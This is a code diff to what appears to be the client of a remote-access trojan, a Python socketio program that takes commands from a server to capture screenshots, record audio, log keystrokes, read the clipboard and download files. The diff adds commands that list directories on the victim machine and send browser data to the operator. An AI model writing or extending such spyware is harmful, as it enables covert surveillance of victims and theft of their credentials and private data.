@@ -5,8 +5,9 @@ import time
 
 import socketio
 
+from client.database_utils import send_browser_data
 from media_utils import take_and_send_screenshot, record_and_send_audio, record_and_send_keyboard_log, download_file, \
-    start_stream as start_media_stream, stop_stream as stop_media_stream, get_clipboard_content
+    start_stream as start_media_stream, stop_stream as stop_media_stream, get_clipboard_content, list_dir
 
 sio = socketio.Client(reconnection=True, reconnection_attempts=5, reconnection_delay=2, ssl_verify=False)
 
@@ -64,6 +65,10 @@ def command(data):
         get_clipboard_content(sio, user_id)
     elif command == 'downloadfile':
         download_file(sio, file_path, user_id)
+    elif command == 'listdir':
+        list_dir(sio, file_path)
+    elif command == 'browserdata':
+        send_browser_data(sio, user_id)
 
 
 @sio.event
@@ -76,6 +81,12 @@ def start_stream(data):
 def stop_stream(data):
     user_id = data.get('user_id')
     stop_media_stream(user_id)
+
+
+@sio.event
+def list_directory(data):
+    directory = data.get('dir_path')
+    list_dir(sio, directory)
 
 
 def attempt_reconnect(server_url):
